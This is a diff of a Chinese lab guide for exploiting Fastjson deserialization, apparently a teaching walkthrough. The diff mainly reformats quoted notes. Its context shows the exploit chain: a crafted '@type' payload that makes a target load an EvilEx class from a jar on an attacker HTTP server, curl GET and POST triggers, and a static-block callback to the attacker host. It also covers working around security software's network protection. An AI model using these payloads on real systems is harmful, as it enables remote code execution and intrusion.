@@ -67,14 +67,6 @@ echo "IP=$IP    DEC=$DEC"
 IP=192.168.244.131    DEC=3232298115
 ```
 
-> 纯 bash 计算，不用 python，也就不碰 `!`。**别用 `python3 -c "...'!I'..."` 那种写法**：`!` 在双引号里会触发历史展开，报 `bash: !!:socket.inet_aton: event not found`，`DEC` 变成空值，类名被打成 `jar:http://:19090/impe!/EvilEx`（IP 位置是空的），后面一路错到 `wrong name`。真要用 python 就这么写：
->
-> ```bash
-> DEC=$(python3 -c 'import socket,struct,sys;print(int.from_bytes(socket.inet_aton(sys.argv[1]),"big"))' "$IP")
-> ```
->
-> 或者先在当前窗口关掉历史展开：`set +H`。
-
 | 写法      | 例子                | 用在哪                                        |
 | ------- | ----------------- | ------------------------------------------ |
 | 点分      | `192.168.244.131` | `curl http://$IP:19090/...`、`/import?url=` |
@@ -120,7 +112,7 @@ cat > EvilEx.java <<'JAVA'
 import com.alibaba.fastjson.annotation.JSONType;
 
 @JSONType
-public class EvilEx extends Exception {
+public class EvilEx extends Exception{
 
     public EvilEx() { super("poc"); }
     public EvilEx(String m) { super(m); }
@@ -146,7 +138,7 @@ public class EvilEx extends Exception {
 JAVA
 ```
 
-> `loader` 那一行用 `Thread.currentThread().getContextClassLoader()`，**不要写 `EvilEx.class.getClassLoader()`** —— 远程加载时 `ldc` 解析自己的类名会失败，`static` 跑到一半抛 `NoClassDefFoundError`，看起来像"没执行"。
+ `loader` 那一行用 `Thread.currentThread().getContextClassLoader()`，**不要写 `EvilEx.class.getClassLoader()`** —— 远程加载时 `ldc` 解析自己的类名会失败，`static` 跑到一半抛 `NoClassDefFoundError`，看起来像"没执行"。
 
 桩注解（只在第一次需要，`com/` 目录结构不能错）：
 
@@ -215,8 +207,8 @@ this_class     jar:http://3232298115:19090/impe!/EvilEx
 
 两边的 IP 都必须是**十进制**，谁都不用点分。写成点分会得到 `wrong name` 或 `IllegalName`。
 
-> `patch_name.py` 要三个参数。少传一个它只打印帮助、不改文件，也不报错。  
-> 名字里带 `!`，所以用 `'...'"$DEC"'...'` 拼接：`!` 在单引号里才不会被 shell 的历史展开吞掉。
+ `patch_name.py` 要三个参数。少传一个它只打印帮助、不改文件，也不报错。  
+ 名字里带 `!`，所以用 `'...'"$DEC"'...'` 拼接：`!` 在单引号里才不会被 shell 的历史展开吞掉。
 
 ## 6. 打包
 
@@ -271,14 +263,13 @@ curl -s 'http://192.168.244.1:18086/trace?type=jar:http:..3232298115:19090.impe!
 
 同时：桌面弹计算器，虚机 `http.server` 窗口打出**一次**来源为 `192.168.244.1` 的 `GET /impe`。
 
-> **POST 写法**（安全软件关掉网络防护后可用）：
->
-> ```bash
-> curl -s -X POST http://192.168.244.1:18086/parse -H 'Content-Type: application/json' --data-binary @body.json; echo
-> ```
->
-> 返回 `{"ok":true,...}`，结果相同。报 `(56) Recv failure` 就是被重置，换回 GET。  
-> `body.json` 的内容：`{"@type":"jar:http:..3232298115:19090.impe!.EvilEx"}`（一行，用 heredoc 写入，`!` 不会被 shell 吃掉）。
+ **POST 写法**（安全软件关掉网络防护后可用）：
+ ```bash
+curl -s -X POST http://192.168.244.1:18086/parse -H 'Content-Type: application/json' --data-binary @body.json; echo
+ ```
+
+ 返回 `{"ok":true,...}`，结果相同。报 `(56) Recv failure` 就是被重置，换回 GET。  
+ `body.json` 的内容：`{"@type":"jar:http:..3232298115:19090.impe!.EvilEx"}`（一行，用 heredoc 写入，`!` 不会被 shell 吃掉）。
 
 **命令被拆断时的典型症状**：终端报 `-H : 无法将…` 或 `event not found`，或者干脆什么都不打印（`-s` 把错误吞了）。看到这个不是载荷问题——排查四连见第 17 节"POST 被重置"一段。
 
@@ -304,13 +295,15 @@ loader : org.springframework.boot.loader.LaunchedURLClassLoader@21b8d17c
 
 计算器也是在同一块屏幕上弹出的——**它是靶机的桌面，不是虚机的**，这一点讲的时候要点明。
 
-> 想让"执行成功"这件事在**虚机**上也能看到（不靠回头看靶机屏幕），在 `static{}` 里加一行回调，然后看 `http.server` 的日志：
->
-> ```java
-> try { new java.net.URL("http://192.168.244.131:19090/hit").openStream().close(); } catch (Throwable ignored) {}
-> ```
->
-> 日志里出现 `GET /hit 404` 就说明代码跑了（404 无所谓，要紧的是这条请求是靶机发的）。IP 记得换成虚机的**点分**写法，这是真实 URL，不用十进制。
+ 想让"执行成功"这件事在**虚机**上也能看到（不靠回头看靶机屏幕），在 `static{}` 里加一行回调，然后看 `http.server` 的日志：
+
+ ```java
+try { 
+new java.net.URL("http://192.168.244.131:19090/hit").openStream().close(); } 
+catch (Throwable ignored) {}
+ ```
+
+ 日志里出现 `GET /hit 404` 就说明代码跑了（404 无所谓，要紧的是这条请求是靶机发的）。IP 记得换成虚机的**点分**写法，这是真实 URL，不用十进制。
 
 **再确认"不落盘"**：`dir C:\fj\uploads` 里没有新增文件（`imp`、`imp2` 那几条是链二留下的，不是这次）。
 
@@ -353,7 +346,7 @@ public class Evil {
 JAVA
 ```
 
-> 这个类**不能**用于链一。普通 JavaBean 会走 `FastjsonASMDeserializer`，实例化时按斜杠名再解析一次，网络流已关 → `NoClassDefFoundError`。它只适合落盘后加载。
+ 这个类**不能**用于链一。普通 JavaBean 会走 `FastjsonASMDeserializer`，实例化时按斜杠名再解析一次，网络流已关 → `NoClassDefFoundError`。它只适合落盘后加载。
 
 ## 11. 编译
 
@@ -510,7 +503,7 @@ z=zipfile.ZipFile('impe11','w',zipfile.ZIP_DEFLATED); z.write('classes/EvilEx.cl
 # @type 改成 jar:http:..<DEC>:19090.impe11!.EvilEx
 ```
 
-> 判断“是不是缓存问题”：看 proof 文件的修改时间。`ok:true` 但 proof 时间没变 = 缓存命中，不是漏洞失效。
+ 判断“是不是缓存问题”：看 proof 文件的修改时间。`ok:true` 但 proof 时间没变 = 缓存命中，不是漏洞失效。
 
 链二换名字（三处同步改）：
 
@@ -570,7 +563,7 @@ curl.exe -s -m 5 -o /dev/null -w "code=%{http_code}\n" http://192.168.244.131:19
 New-NetFirewallRule -DisplayName "lab-18086" -Direction Inbound -Protocol TCP -LocalPort 18086 -Action Allow -Profile Any
 ```
 
-> 症状特征：虚机上 `curl` **一点输出都没有**就回到提示符。`/parse` 内部 `catch (Throwable)` 后一定返回 JSON，空响应只能是请求没到。
+ 症状特征：虚机上 `curl` **一点输出都没有**就回到提示符。`/parse` 内部 `catch (Throwable)` 后一定返回 JSON，空响应只能是请求没到。
 
 ### POST 被重置时改用 GET 触发（2026-11-13 实测）
 
